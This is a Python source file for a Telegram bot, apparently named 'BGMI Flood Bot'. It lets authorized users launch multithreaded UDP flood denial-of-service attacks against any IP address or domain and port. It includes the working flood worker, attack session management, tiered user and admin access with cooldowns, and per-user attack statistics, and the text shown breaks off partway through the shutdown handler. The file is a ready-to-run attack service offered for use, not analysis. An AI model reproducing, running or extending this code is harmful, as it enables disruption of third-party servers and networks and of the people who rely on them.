#!/usr/bin/env python3
"""
By - @LEGENDX22
"""

import os
import re
import json
import socket
import random
import logging
import asyncio
import threading
import ipaddress
import signal
from uuid import uuid4
from pathlib import Path
from datetime import datetime, timedelta
from dataclasses import dataclass, field, asdict
from typing import Optional
from concurrent.futures import ThreadPoolExecutor

from telethon import TelegramClient, events, Button
from telethon.tl.types import User

# ━━━━━━━━━━━━━━━━━━━━ CONFIGURATION ━━━━━━━━━━━━━━━━━━━━

API_ID = 1234                  # Your Telegram API ID
API_HASH = ""  # Your Telegram API Hash
BOT_TOKEN = ""  # Bot token from @BotFather

OWNER_ID = 1234             # LEGENDX - Supreme Authority

CONFIG_FILE = "config.json"
USERS_FILE = "users.json"
LOG_DIR = Path("logs")
LOG_FILE = LOG_DIR / "attacks.log"

# Default settings (overridden by config.json)
DEFAULT_CONFIG = {
    "admin_ids": [],
    "cooldown_sec": 300,          # 5 min for users
    "admin_cooldown_sec": 15,     # 15 sec for admins
    "max_attack_time": 300,       # Max 5 min
    "max_threads": 500,
    "default_threads": 100,
    "default_packet_size": 1024,
    "log_channel": None,
}

# ━━━━━━━━━━━━━━━━━━━━ LOGGING SETUP ━━━━━━━━━━━━━━━━━━━━

LOG_DIR.mkdir(exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s | %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('BGMI_FLOOD')

# ━━━━━━━━━━━━━━━━━━━━ DATA CLASSES ━━━━━━━━━━━━━━━━━━━━

@dataclass
class AttackSession:
    """Active attack session."""
    id: str
    user_id: int
    username: str
    target: str
    target_ip: str  # Resolved IP (IPv4 or IPv6)
    is_ipv6: bool
    port: int
    duration: int
    threads: int
    packet_size: int
    started_at: datetime
    end_time: float
    packets_sent: int = 0
    bytes_sent: int = 0
    _packets_lock: threading.Lock = field(default_factory=threading.Lock)
    stop_flag: threading.Event = field(default_factory=threading.Event)
    workers: list = field(default_factory=list)
    sockets: list = field(default_factory=list)  # For socket reuse
    status: str = "running"  # running, completed, stopped
    
    def increment_stats(self, packets: int, bytes_count: int):
        """Thread-safe stats update."""
        with self._packets_lock:
            self.packets_sent += packets
            self.bytes_sent += bytes_count

@dataclass
class UserStats:
    """Per-user statistics."""
    total_attacks: int = 0
    total_packets: int = 0
    total_bytes: int = 0
    last_attack: Optional[str] = None

@dataclass
class GlobalStats:
    """Global bot statistics."""
    total_attacks: int = 0
    total_packets: int = 0
    total_bytes: int = 0
    uptime_start: str = field(default_factory=lambda: datetime.now().isoformat())

# ━━━━━━━━━━━━━━━━━━━━ CONFIG MANAGER ━━━━━━━━━━━━━━━━━━━━

class ConfigManager:
    """Manages bot configuration."""
    
    def __init__(self):
        self.config = DEFAULT_CONFIG.copy()
        self.load()
    
    def load(self):
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, 'r') as f:
                    saved = json.load(f)
                    self.config.update(saved)
                logger.info(f"Config loaded from {CONFIG_FILE}")
        except Exception as e:
            logger.warning(f"Config load failed: {e}, using defaults")
        self.save()
    
    def save(self):
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(self.config, f, indent=2)
        except Exception as e:
            logger.error(f"Config save failed: {e}")
    
    def get(self, key: str, default=None):
        return self.config.get(key, default)
    
    def set(self, key: str, value):
        self.config[key] = value
        self.save()

# ━━━━━━━━━━━━━━━━━━━━ USER MANAGER ━━━━━━━━━━━━━━━━━━━━

class UserManager:
    """Manages authorized users and their data."""
    
    def __init__(self):
        self._defaults = {
            "authorized": [],
            "cooldowns": {},
            "stats": {},
        }
        self.data = self._defaults.copy()
        self.load()
    
    def load(self):
        try:
            if os.path.exists(USERS_FILE):
                with open(USERS_FILE, 'r') as f:
                    saved = json.load(f)
                # Merge with defaults to ensure all keys exist
                for key, default_val in self._defaults.items():
                    if key not in saved:
                        saved[key] = default_val
                self.data = saved
                logger.info(f"Users loaded: {len(self.data.get('authorized', []))} users")
        except Exception as e:
            logger.warning(f"Users load failed: {e}")
        self.save()
    
    def save(self):
        try:
            with open(USERS_FILE, 'w') as f:
                json.dump(self.data, f, indent=2)
        except Exception as e:
            logger.error(f"Users save failed: {e}")
    
    def add_user(self, user_id: int) -> bool:
        if user_id not in self.data["authorized"]:
            self.data["authorized"].append(user_id)
            self.save()
            return True
        return False
    
    def remove_user(self, user_id: int) -> bool:
        if user_id in self.data["authorized"]:
            self.data["authorized"].remove(user_id)
            self.save()
            return True
        return False
    
    def is_authorized(self, user_id: int) -> bool:
        return user_id in self.data["authorized"]
    
    def get_all_users(self) -> list:
        return self.data["authorized"].copy()
    
    def get_cooldown(self, user_id: int) -> Optional[datetime]:
        ts = self.data["cooldowns"].get(str(user_id))
        if ts:
            return datetime.fromisoformat(ts)
        return None
    
    def set_cooldown(self, user_id: int):
        self.data["cooldowns"][str(user_id)] = datetime.now().isoformat()
        self.save()
    
    def get_stats(self, user_id: int) -> UserStats:
        raw = self.data.get("stats", {}).get(str(user_id), {})
        return UserStats(**raw) if raw else UserStats()
    
    def update_stats(self, user_id: int, packets: int, bytes_sent: int):
        uid = str(user_id)
        if uid not in self.data.get("stats", {}):
            self.data.setdefault("stats", {})[uid] = asdict(UserStats())
        
        self.data["stats"][uid]["total_attacks"] += 1
        self.data["stats"][uid]["total_packets"] += packets
        self.data["stats"][uid]["total_bytes"] += bytes_sent
        self.data["stats"][uid]["last_attack"] = datetime.now().isoformat()
        self.save()

# ━━━━━━━━━━━━━━━━━━━━ ATTACK MANAGER ━━━━━━━━━━━━━━━━━━━━

class AttackManager:
    """Manages attack sessions."""
    
    def __init__(self):
        self.active: dict[str, AttackSession] = {}
        self.global_stats = GlobalStats()
        self._lock = threading.Lock()
    
    def get_user_attacks(self, user_id: int) -> list[AttackSession]:
        return [s for s in self.active.values() if s.user_id == user_id]
    
    def user_has_active(self, user_id: int) -> bool:
        return any(s.user_id == user_id for s in self.active.values())
    
    def start_attack(
        self,
        user_id: int,
        username: str,
        target: str,
        target_ip: str,
        is_ipv6: bool,
        port: int,
        duration: int,
        threads: int,
        packet_size: int = 1024
    ) -> AttackSession:
        """Start a new attack session."""
        
        # Use monotonic time for consistent end_time
        end_time = datetime.now().timestamp() + duration
        
        session = AttackSession(
            id=uuid4().hex[:8],
            user_id=user_id,
            username=username,
            target=target,
            target_ip=target_ip,
            is_ipv6=is_ipv6,
            port=port,
            duration=duration,
            threads=threads,
            packet_size=packet_size,
            started_at=datetime.now(),
            end_time=end_time
        )
        
        # Pre-create reusable sockets for each worker
        sock_family = socket.AF_INET6 if is_ipv6 else socket.AF_INET
        for _ in range(threads):
            try:
                sock = socket.socket(sock_family, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.setblocking(False)
                session.sockets.append(sock)
            except Exception as e:
                logger.warning(f"Socket creation failed: {e}")
        
        with self._lock:
            self.active[session.id] = session
        
        # Start worker threads with pre-assigned sockets
        for i in range(threads):
            sock = session.sockets[i] if i < len(session.sockets) else None
            t = threading.Thread(
                target=self._flood_worker,
                args=(session, sock),
                daemon=True
            )
            session.workers.append(t)
            t.start()
        
        # Start monitor thread
        threading.Thread(
            target=self._monitor_attack,
            args=(session,),
            daemon=True
        ).start()
        
        logger.info(
            f"LAUNCH | user:{username}({user_id}) | "
            f"target:{target}:{port} | duration:{duration}s | "
            f"threads:{threads} | id:{session.id}"
        )
        
        return session
    
    def _flood_worker(self, session: AttackSession, sock: socket.socket = None):
        """Worker thread that sends UDP packets."""
        owns_socket = False
        try:
            # Use provided socket or create new one
            if sock is None:
                sock_family = socket.AF_INET6 if session.is_ipv6 else socket.AF_INET
                sock = socket.socket(sock_family, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                owns_socket = True
            
            target_addr = (session.target_ip, session.port)
            local_packets = 0
            local_bytes = 0
            
            while not session.stop_flag.is_set():
                if datetime.now().timestamp() >= session.end_time:
                    break
                
                try:
                    payload = os.urandom(session.packet_size)
                    sock.sendto(payload, target_addr)
                    local_packets += 1
                    local_bytes += len(payload)
                    
                    # Batch update every 100 packets to reduce lock contention
                    if local_packets >= 100:
                        session.increment_stats(local_packets, local_bytes)
                        local_packets = 0
                        local_bytes = 0
                except Exception:
                    pass  # Silently ignore send errors
            
            # Final stats flush
            if local_packets > 0:
                session.increment_stats(local_packets, local_bytes)
            
            # Only close if we created the socket
            if owns_socket:
                sock.close()
        except Exception as e:
            logger.error(f"Worker error: {e}")
    
    def _monitor_attack(self, session: AttackSession):
        """Monitor attack and cleanup when done."""
        import time
        
        # Wait for duration
        while not session.stop_flag.is_set():
            if datetime.now().timestamp() >= session.end_time:
                break
            time.sleep(0.5)
        
        # Signal stop
        session.stop_flag.set()
        
        # Wait for workers to finish (max 5 sec)
        for t in session.workers:
            t.join(timeout=1)
        
        # Update status
        if session.status == "running":
            session.status = "completed"
        
        # Update global stats
        self.global_stats.total_attacks += 1
        self.global_stats.total_packets += session.packets_sent
        self.global_stats.total_bytes += session.bytes_sent
        
        # Cleanup sockets
        for sock in session.sockets:
            try:
                sock.close()
            except Exception:
                pass
        session.sockets.clear()
        
        # Remove from active
        with self._lock:
            self.active.pop(session.id, None)
        
        logger.info(
            f"FINISH | id:{session.id} | "
            f"packets:{session.packets_sent:,} | "
            f"bytes:{self._format_bytes(session.bytes_sent)} | "
            f"status:{session.status}"
        )
    
    def stop_attack(self, attack_id: str) -> Optional[AttackSession]:
        """Stop a specific attack."""
        session = self.active.get(attack_id)
        if session:
            session.status = "stopped"
            session.stop_flag.set()
            logger.info(f"STOP | id:{attack_id} | reason:manual")
            return session
        return None
    
    def stop_user_attacks(self, user_id: int) -> int:
        """Stop all attacks by a user."""
        count = 0
        for session in list(self.active.values()):
            if session.user_id == user_id:
                self.stop_attack(session.id)
                count += 1
        return count
    
    def stop_all(self) -> int:
        """Stop ALL attacks."""
        count = len(self.active)
        for session_id in list(self.active.keys()):
            self.stop_attack(session_id)
        return count
    
    @staticmethod
    def _format_bytes(b: int) -> str:
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if b < 1024:
                return f"{b:.2f} {unit}"
            b /= 1024
        return f"{b:.2f} PB"

# ━━━━━━━━━━━━━━━━━━━━ PERMISSION HELPERS ━━━━━━━━━━━━━━━━━━━━

def is_owner(user_id: int) -> bool:
    return user_id == OWNER_ID

def is_admin(user_id: int, config: ConfigManager) -> bool:
    return user_id in config.get("admin_ids", []) or is_owner(user_id)

def is_authorized(user_id: int, config: ConfigManager, users: UserManager) -> bool:
    return is_admin(user_id, config) or users.is_authorized(user_id)

def get_permission_level(user_id: int, config: ConfigManager, users: UserManager) -> str:
    if is_owner(user_id):
        return "owner"
    if is_admin(user_id, config):
        return "admin"
    if users.is_authorized(user_id):
        return "user"
    return "none"

# ━━━━━━━━━━━━━━━━━━━━ VALIDATION HELPERS ━━━━━━━━━━━━━━━━━━━━

async def validate_target(target: str) -> tuple[bool, str, bool]:
    """Validate IP address or resolve domain asynchronously.
    Returns: (valid, ip_or_error, is_ipv6)
    """
    # Check if it's an IP
    try:
        ip = ipaddress.ip_address(target)
        return True, str(ip), isinstance(ip, ipaddress.IPv6Address)
    except ValueError:
        pass
    
    # Try to resolve domain asynchronously (non-blocking)
    loop = asyncio.get_event_loop()
    try:
        # Try IPv4 first
        info = await loop.getaddrinfo(target, None, socket.AF_INET, socket.SOCK_DGRAM)
        if info:
            ip = info[0][4][0]
            return True, ip, False
    except socket.gaierror:
        pass
    
    try:
        # Fallback to IPv6
        info = await loop.getaddrinfo(target, None, socket.AF_INET6, socket.SOCK_DGRAM)
        if info:
            ip = info[0][4][0]
            return True, ip, True
    except socket.gaierror:
        pass
    
    return False, "Invalid IP or unresolvable domain", False

def validate_port(port_str: str) -> tuple[bool, int, str]:
    """Validate port number."""
    try:
        port = int(port_str)
        if 1 <= port <= 65535:
            return True, port, ""
        return False, 0, "Port must be 1-65535"
    except ValueError:
        return False, 0, "Port must be a number"

def validate_time(time_str: str, max_time: int) -> tuple[bool, int, str]:
    """Validate attack duration."""
    try:
        t = int(time_str)
        if t < 1:
            return False, 0, "Duration must be at least 1 second"
        if t > max_time:
            return False, 0, f"Max duration is {max_time}s"
        return True, t, ""
    except ValueError:
        return False, 0, "Duration must be a number"

def validate_threads(threads_str: str, max_threads: int, default: int) -> tuple[int, str]:
    """Validate thread count."""
    if not threads_str:
        return default, ""
    try:
        t = int(threads_str)
        if t < 1:
            return default, "Using default threads"
        if t > max_threads:
            return max_threads, f"Capped to max {max_threads}"
        return t, ""
    except ValueError:
        return default, "Invalid threads, using default"

# ━━━━━━━━━━━━━━━━━━━━ MESSAGE FORMATTERS ━━━━━━━━━━━━━━━━━━━━

def format_attack_launched(session: AttackSession) -> str:
    return f"""
🚀 **𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗**

┌ 🎯 **Target:** `{session.target}`
├ 🔌 **Port:** `{session.port}`
├ ⏱ **Duration:** `{session.duration}s`
├ 🧵 **Threads:** `{session.threads}`
├ 📦 **Method:** UDP Flood
├ 🆔 **Attack ID:** `{session.id}`
└ 👤 **By:** {session.username}

⏳ Attack running...
"""

def format_attack_finished(session: AttackSession, users: UserManager) -> str:
    elapsed = (datetime.now() - session.started_at).total_seconds()
    pps = session.packets_sent / max(elapsed, 1)
    
    # Update user stats
    users.update_stats(session.user_id, session.packets_sent, session.bytes_sent)
    
    status_emoji = "✅" if session.status == "completed" else "⛔"
    status_text = "COMPLETED" if session.status == "completed" else "STOPPED"
    
    return f"""
{status_emoji} **𝗔𝗧𝗧𝗔𝗖𝗞 {status_text}**

┌ 🎯 **Target:** `{session.target}:{session.port}`
├ ⏱ **Duration:** `{elapsed:.1f}s`
├ 📊 **Packets:** `{session.packets_sent:,}`
├ 💾 **Data Sent:** `{AttackManager._format_bytes(session.bytes_sent)}`
├ ⚡ **Rate:** `{pps:,.0f} pkt/s`
└ 🆔 **ID:** `{session.id}`

Ready for next target 🔥
"""

def format_help(level: str) -> str:
    base = """
⚡ **BGMI FLOOD BOT**

**📋 Public Commands:**
• `/start` — Welcome message
• `/help` — This message
• `/id` — Your Telegram ID
• `/ping` — Check bot latency
"""
    
    if level == "none":
        base += "\n❌ You are not authorized. Contact owner for access."
        return base
    
    base += """
**⚔️ Attack Commands:**
• `/attack <ip> <port> <time> [threads]` — Launch UDP flood
• `/stop [attack_id]` — Stop your attack(s)
• `/running` — Your active attacks
• `/mystats` — Your attack statistics
"""
    
    if level in ("admin", "owner"):
        base += """
**🔧 Admin Commands:**
• `/add <user_id>` — Authorize user
• `/remove <user_id>` — Remove user
• `/users` — List all users
• `/logs [count]` — View attack logs
• `/clearlogs` — Clear all logs
• `/stats` — Global statistics
"""
    
    if level == "owner":
        base += """
**👑 Owner Commands:**
• `/addadmin <user_id>` — Promote to admin
• `/removeadmin <user_id>` — Demote admin
• `/admins` — List all admins
• `/broadcast <msg>` — Message all users
• `/stopall` — Kill ALL attacks
• `/setcooldown <sec>` — Change cooldown
• `/setmaxtime <sec>` — Change max time
• `/status` — Bot status
"""
    
    return base

# ━━━━━━━━━━━━━━━━━━━━ MAIN BOT ━━━━━━━━━━━━━━━━━━━━

# Initialize managers
config = ConfigManager()
users = UserManager()
attacks = AttackManager()

# Initialize bot
bot = TelegramClient('bgmi_flood_bot', API_ID, API_HASH)

# Graceful shutdown - will be set up in main()
shutdown_requested = False

# ═══════════════════ PUBLIC COMMANDS ═══════════════════

@bot.on(events.NewMessage(pattern=r'^/start'))
async def cmd_start(event):
    user = await event.get_sender()
    name = user.first_name if user else "User"
    level = get_permission_level(event.sender_id, config, users)
    
    buttons = [
        [Button.inline("📖 Help", b"help"), Button.inline("🆔 My ID", b"myid")],
        [Button.inline("📊 My Stats", b"mystats"), Button.inline("🏃 Running", b"running")],
    ]
    
    status = "✅ Authorized" if level != "none" else "❌ Not Authorized"
    
    await event.reply(f"""
╔══════════════════════════════════╗
║    ⚡  **𝗕𝗚𝗠𝗜 𝗙𝗟𝗢𝗢𝗗 𝗕𝗢𝗧**  ⚡     ║
║   Pure Python UDP Flood Engine   ║
╚══════════════════════════════════╝

Welcome **{name}**! 🔥

**Status:** {status}
**Level:** {level.upper()}

Use `/help` for commands.
""", buttons=buttons)

@bot.on(events.CallbackQuery(pattern=b"help"))
async def cb_help(event):
    level = get_permission_level(event.sender_id, config, users)
    await event.answer()
    await event.respond(format_help(level))

@bot.on(events.CallbackQuery(pattern=b"myid"))
async def cb_myid(event):
    await event.answer(f"Your ID: {event.sender_id}", alert=True)

@bot.on(events.CallbackQuery(pattern=b"mystats"))
async def cb_mystats(event):
    await event.answer()
    stats = users.get_stats(event.sender_id)
    await event.respond(f"""
📊 **Your Statistics**

• **Total Attacks:** {stats.total_attacks}
• **Total Packets:** {stats.total_packets:,}
• **Total Data:** {AttackManager._format_bytes(stats.total_bytes)}
• **Last Attack:** {stats.last_attack or 'Never'}
""")

@bot.on(events.CallbackQuery(pattern=b"running"))
async def cb_running(event):
    await event.answer()
    user_attacks = attacks.get_user_attacks(event.sender_id)
    if not user_attacks:
        await event.respond("No running attacks.")
        return
    
    msg = "🏃 **Your Running Attacks:**\n\n"
    for s in user_attacks:
        elapsed = (datetime.now() - s.started_at).total_seconds()
        remaining = max(0, s.duration - elapsed)
        msg += f"• `{s.id}` → `{s.target}:{s.port}` ({remaining:.0f}s left)\n"
    
    await event.respond(msg)

@bot.on(events.NewMessage(pattern=r'^/help'))
async def cmd_help(event):
    level = get_permission_level(event.sender_id, config, users)
    await event.reply(format_help(level))

@bot.on(events.NewMessage(pattern=r'^/id'))
async def cmd_id(event):
    await event.reply(f"🆔 Your ID: `{event.sender_id}`")

@bot.on(events.NewMessage(pattern=r'^/ping'))
async def cmd_ping(event):
    start = datetime.now()
    msg = await event.reply("🏓 Pinging...")
    latency = (datetime.now() - start).total_seconds() * 1000
    await msg.edit(f"🏓 Pong! `{latency:.0f}ms`")

# ═══════════════════ ATTACK COMMANDS ═══════════════════

@bot.on(events.NewMessage(pattern=r'^/attack\s+(\S+)\s+(\S+)\s+(\S+)(?:\s+(\S+))?'))
async def cmd_attack(event):
    user_id = event.sender_id
    level = get_permission_level(user_id, config, users)
    
    # Check authorization
    if level == "none":
        await event.reply("❌ **Not authorized.** Contact owner for access.")
        return
    
    # Check if user already has active attack
    if attacks.user_has_active(user_id) and level != "owner":
        await event.reply("⚠️ You already have an active attack. Wait or `/stop` it first.")
        return
    
    # Parse arguments
    match = event.pattern_match
    target_raw = match.group(1)
    port_raw = match.group(2)
    time_raw = match.group(3)
    threads_raw = match.group(4) or ""
    
    # Validate target (async DNS resolution)
    valid, target_ip, is_ipv6 = await validate_target(target_raw)
    if not valid:
        await event.reply(f"❌ **Invalid target:** {target_ip}")
        return
    
    # Validate port
    valid, port, err = validate_port(port_raw)
    if not valid:
        await event.reply(f"❌ **Invalid port:** {err}")
        return
    
    # Validate duration
    max_time = config.get("max_attack_time", 300)
    valid, duration, err = validate_time(time_raw, max_time)
    if not valid:
        await event.reply(f"❌ **Invalid duration:** {err}")
        return
    
    # Validate threads
    max_threads = config.get("max_threads", 500)
    default_threads = config.get("default_threads", 100)
    threads, thread_warn = validate_threads(threads_raw, max_threads, default_threads)
    
    # Check cooldown (skip for owner)
    if level != "owner":
        cooldown_sec = config.get("admin_cooldown_sec" if level == "admin" else "cooldown_sec", 300)
        last_attack = users.get_cooldown(user_id)
        
        if last_attack:
            elapsed = (datetime.now() - last_attack).total_seconds()
            if elapsed < cooldown_sec:
                remaining = int(cooldown_sec - elapsed)
                await event.reply(f"⏳ **Cooldown active!** Wait `{remaining}s` before next attack.")
                return
    
    # Set cooldown
    users.set_cooldown(user_id)
    
    # Get username
    sender = await event.get_sender()
    username = f"@{sender.username}" if sender.username else sender.first_name
    
    # Start attack
    session = attacks.start_attack(
        user_id=user_id,
        username=username,
        target=target_raw,
        target_ip=target_ip,
        is_ipv6=is_ipv6,
        port=port,
        duration=duration,
        threads=threads,
        packet_size=config.get("default_packet_size", 1024)
    )
    
    # Send launch message
    msg = await event.reply(format_attack_launched(session))
    
    # Wait for completion and send finish message
    async def wait_and_notify():
        while session.id in attacks.active:
            await asyncio.sleep(1)
        await event.respond(format_attack_finished(session, users))
    
    asyncio.create_task(wait_and_notify())

@bot.on(events.NewMessage(pattern=r'^/stop(?:\s+(\S+))?'))
async def cmd_stop(event):
    user_id = event.sender_id
    level = get_permission_level(user_id, config, users)
    
    if level == "none":
        await event.reply("❌ Not authorized.")
        return
    
    attack_id = event.pattern_match.group(1)
    
    if attack_id:
        # Stop specific attack
        session = attacks.active.get(attack_id)
        if not session:
            await event.reply(f"❌ Attack `{attack_id}` not found.")
            return
        
        # Check ownership (owner and admins can stop any)
        if session.user_id != user_id and level not in ("owner", "admin"):
            await event.reply("❌ You can only stop your own attacks.")
            return
        
        attacks.stop_attack(attack_id)
        await event.reply(f"⛔ Attack `{attack_id}` stopped.")
    else:
        # Stop all user's attacks
        count = attacks.stop_user_attacks(user_id)
        if count:
            await event.reply(f"⛔ Stopped {count} attack(s).")
        else:
            await event.reply("No active attacks to stop.")

@bot.on(events.NewMessage(pattern=r'^/running'))
async def cmd_running(event):
    user_attacks = attacks.get_user_attacks(event.sender_id)
    if not user_attacks:
        await event.reply("No running attacks.")
        return
    
    msg = "🏃 **Your Running Attacks:**\n\n"
    for s in user_attacks:
        elapsed = (datetime.now() - s.started_at).total_seconds()
        remaining = max(0, s.duration - elapsed)
        msg += f"• `{s.id}` → `{s.target}:{s.port}` ({remaining:.0f}s left, {s.packets_sent:,} pkts)\n"
    
    await event.reply(msg)

@bot.on(events.NewMessage(pattern=r'^/mystats'))
async def cmd_mystats(event):
    stats = users.get_stats(event.sender_id)
    await event.reply(f"""
📊 **Your Statistics**

• **Total Attacks:** {stats.total_attacks}
• **Total Packets:** {stats.total_packets:,}
• **Total Data:** {AttackManager._format_bytes(stats.total_bytes)}
• **Last Attack:** {stats.last_attack or 'Never'}
""")

# ═══════════════════ ADMIN COMMANDS ═══════════════════

@bot.on(events.NewMessage(pattern=r'^/add\s+(\d+)'))
async def cmd_add(event):
    if not is_admin(event.sender_id, config):
        await event.reply("🔒 **Admin only.**")
        return
    
    uid = int(event.pattern_match.group(1))
    
    if users.add_user(uid):
        await event.reply(f"✅ User `{uid}` authorized!")
        logger.info(f"USER_ADD | by:{event.sender_id} | added:{uid}")
    else:
        await event.reply(f"ℹ️ User `{uid}` already authorized.")

@bot.on(events.NewMessage(pattern=r'^/remove\s+(\d+)'))
async def cmd_remove(event):
    if not is_admin(event.sender_id, config):
        await event.reply("🔒 **Admin only.**")
        return
    
    uid = int(event.pattern_match.group(1))
    
    if users.remove_user(uid):
        await event.reply(f"🗑 User `{uid}` removed.")
        logger.info(f"USER_REMOVE | by:{event.sender_id} | removed:{uid}")
    else:
        await event.reply(f"❌ User `{uid}` not found.")

@bot.on(events.NewMessage(pattern=r'^/users'))
async def cmd_users(event):
    if not is_admin(event.sender_id, config):
        await event.reply("🔒 **Admin only.**")
        return
    
    user_list = users.get_all_users()
    if not user_list:
        await event.reply("📋 No authorized users.")
        return
    
    msg = f"👥 **Authorized Users ({len(user_list)}):**\n\n"
    for uid in user_list:
        msg += f"• `{uid}`\n"
    
    await event.reply(msg)

@bot.on(events.NewMessage(pattern=r'^/logs(?:\s+(\d+))?'))
async def cmd_logs(event):
    if not is_admin(event.sender_id, config):
        await event.reply("🔒 **Admin only.**")
        return
    
    count = int(event.pattern_match.group(1) or 20)
    
    if not LOG_FILE.exists() or LOG_FILE.stat().st_size == 0:
        await event.reply("📋 No logs found.")
        return
    
    with open(LOG_FILE, 'r') as f:
        lines = f.readlines()[-count:]
    
    if not lines:
        await event.reply("📋 No logs found.")
        return
    
    log_text = "".join(lines)
    if len(log_text) > 4000:
        # Send as file
        await event.reply(file=LOG_FILE, message="📄 Attack Logs")
    else:
        await event.reply(f"📋 **Recent Logs ({len(lines)}):**\n\n```\n{log_text}```")

@bot.on(events.NewMessage(pattern=r'^/clearlogs'))
async def cmd_clearlogs(event):
    if not is_admin(event.sender_id, config):
        await event.reply("🔒 **Admin only.**")
        return
    
    open(LOG_FILE, 'w').close()
    await event.reply("🧹 Logs cleared!")
    logger.info(f"LOGS_CLEARED | by:{event.sender_id}")

@bot.on(events.NewMessage(pattern=r'^/stats'))
async def cmd_stats(event):
    if not is_admin(event.sender_id, config):
        await event.reply("🔒 **Admin only.**")
        return
    
    gs = attacks.global_stats
    active_count = len(attacks.active)
    user_count = len(users.get_all_users())
    admin_count = len(config.get("admin_ids", []))
    
    await event.reply(f"""
📊 **Global Statistics**

**Users:**
• Admins: {admin_count}
• Users: {user_count}

**Attacks:**
• Total: {gs.total_attacks}
• Active: {active_count}
• Packets: {gs.total_packets:,}
• Data: {AttackManager._format_bytes(gs.total_bytes)}

**Uptime:** Since {gs.uptime_start[:19]}
""")

# ═══════════════════ OWNER COMMANDS ═══════════════════

@bot.on(events.NewMessage(pattern=r'^/addadmin\s+(\d+)'))
async def cmd_addadmin(event):
    if not is_owner(event.sender_id):
        await event.reply("👑 **Owner only.**")
        return
    
    uid = int(event.pattern_match.group(1))
    admins = config.get("admin_ids", [])
    
    if uid in admins:
        await event.reply(f"ℹ️ `{uid}` is already an admin.")
        return
    
    admins.append(uid)
    config.set("admin_ids", admins)
    await event.reply(f"✅ `{uid}` promoted to admin!")
    logger.info(f"ADMIN_ADD | added:{uid}")

@bot.on(events.NewMessage(pattern=r'^/removeadmin\s+(\d+)'))
async def cmd_removeadmin(event):
    if not is_owner(event.sender_id):
        await event.reply("👑 **Owner only.**")
        return
    
    uid = int(event.pattern_match.group(1))
    admins = config.get("admin_ids", [])
    
    if uid not in admins:
        await event.reply(f"❌ `{uid}` is not an admin.")
        return
    
    admins.remove(uid)
    config.set("admin_ids", admins)
    await event.reply(f"🗑 `{uid}` demoted from admin.")
    logger.info(f"ADMIN_REMOVE | removed:{uid}")

@bot.on(events.NewMessage(pattern=r'^/admins'))
async def cmd_admins(event):
    if not is_owner(event.sender_id):
        await event.reply("👑 **Owner only.**")
        return
    
    admins = config.get("admin_ids", [])
    if not admins:
        await event.reply("📋 No admins configured.")
        return
    
    msg = f"🔧 **Admins ({len(admins)}):**\n\n"
    for uid in admins:
        msg += f"• `{uid}`\n"
    
    await event.reply(msg)

@bot.on(events.NewMessage(pattern=r'^/stopall'))
async def cmd_stopall(event):
    if not is_owner(event.sender_id):
        await event.reply("👑 **Owner only.**")
        return
    
    count = attacks.stop_all()
    await event.reply(f"⛔ Stopped **{count}** attack(s).")
    logger.info(f"STOPALL | by:{event.sender_id} | count:{count}")

@bot.on(events.NewMessage(pattern=r'^/setcooldown\s+(\d+)'))
async def cmd_setcooldown(event):
    if not is_owner(event.sender_id):
        await event.reply("👑 **Owner only.**")
        return
    
    secs = int(event.pattern_match.group(1))
    config.set("cooldown_sec", secs)
    await event.reply(f"✅ User cooldown set to `{secs}s`")

@bot.on(events.NewMessage(pattern=r'^/setmaxtime\s+(\d+)'))
async def cmd_setmaxtime(event):
    if not is_owner(event.sender_id):
        await event.reply("👑 **Owner only.**")
        return
    
    secs = int(event.pattern_match.group(1))
    config.set("max_attack_time", secs)
    await event.reply(f"✅ Max attack time set to `{secs}s`")

@bot.on(events.NewMessage(pattern=r'(?s)^/broadcast\s+(.+)'))
async def cmd_broadcast(event):
    if not is_owner(event.sender_id):
        await event.reply("👑 **Owner only.**")
        return
    
    msg_text = event.pattern_match.group(1)
    user_list = users.get_all_users()
    
    sent, failed = 0, 0
    for uid in user_list:
        try:
            await bot.send_message(uid, f"📢 **Broadcast:**\n\n{msg_text}")
            sent += 1
        except Exception:
            failed += 1
    
    await event.reply(f"📢 Broadcast complete!\n✅ Sent: {sent} | ❌ Failed: {failed}")

@bot.on(events.NewMessage(pattern=r'^/status'))
async def cmd_status(event):
    if not is_owner(event.sender_id):
        await event.reply("👑 **Owner only.**")
        return
    
    import platform
    import psutil
    
    cpu = psutil.cpu_percent()
    mem = psutil.virtual_memory()
    
    await event.reply(f"""
🖥 **Bot Status**

**System:**
• OS: {platform.system()} {platform.release()}
• Python: {platform.python_version()}
• CPU: {cpu}%
• RAM: {mem.percent}% ({mem.used // 1024 // 1024}MB / {mem.total // 1024 // 1024}MB)

**Bot:**
• Active Attacks: {len(attacks.active)}
• Users: {len(users.get_all_users())}
• Admins: {len(config.get('admin_ids', []))}

**Config:**
• Cooldown: {config.get('cooldown_sec')}s
• Admin Cooldown: {config.get('admin_cooldown_sec')}s
• Max Time: {config.get('max_attack_time')}s
• Max Threads: {config.get('max_threads')}
""")

# ═══════════════════ FALLBACK HANDLER ═══════════════════

@bot.on(events.NewMessage(pattern=r'^/attack'))
async def cmd_attack_usage(event):
    await event.reply("⚠️ **Usage:** `/attack <ip> <port> <time> [threads]`\n\n_Example: `/attack 1.2.3.4 80 120 200`_")

# ━━━━━━━━━━━━━━━━━━━━ MAIN ━━━━━━━━━━━━━━━━━━━━

async def main():
    global shutdown_requested
    
    logger.info("⚡ BGMI Flood Bot starting...")
    logger.info(f"   Owner: {OWNER_ID}")
    logger.info(f"   Admins: {config.get('admin_ids', [])}")
    logger.info(f"   Users: {len(users.get_all_users())}")
    
    # Get event loop for signal handlers
    loop = asyncio.get_running_loop()
    
    def shutdown_handler():
        global shutdown_requested
        if shutdown_requested:
            logger.info("Force exit...")
            os._exit(1)
        shutdown_requested = True
        logger.info("Shutting down...")
        count = attacks.stop_all()
        if count:
